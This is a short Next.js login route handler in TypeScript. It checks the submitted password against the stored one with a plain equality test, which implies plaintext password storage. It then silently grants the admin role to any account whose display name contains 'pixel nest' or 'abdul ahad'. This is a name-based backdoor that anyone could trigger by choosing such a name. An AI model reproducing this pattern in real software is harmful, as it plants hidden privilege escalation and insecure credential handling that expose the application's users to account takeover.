import { NextRequest, NextResponse } from "next/server";
import { getUserByEmail, updateUser } from "@/lib/db";

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json();

    const user = await getUserByEmail(email);

    if (!user || user.password !== password) {
      return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
    }

    // Pixel Nest user always gets admin authority
    if (user.name && user.name.toLowerCase().includes("pixel nest")) {
      await updateUser(user.id, { role: "admin" });
      user.role = "admin";
    }
    
    // Abdul Ahad (Web developer) gets admin authority for board access
    if (user.name && user.name.toLowerCase().includes("abdul ahad")) {
      await updateUser(user.id, { role: "admin" });
      user.role = "admin";
    }

    const { password: _, ...userWithoutPassword } = user;
    return NextResponse.json({ user: userWithoutPassword });
  } catch (error) {
    console.error("Login error:", error);
    return NextResponse.json({ error: "Login failed" }, { status: 500 });
  }
}
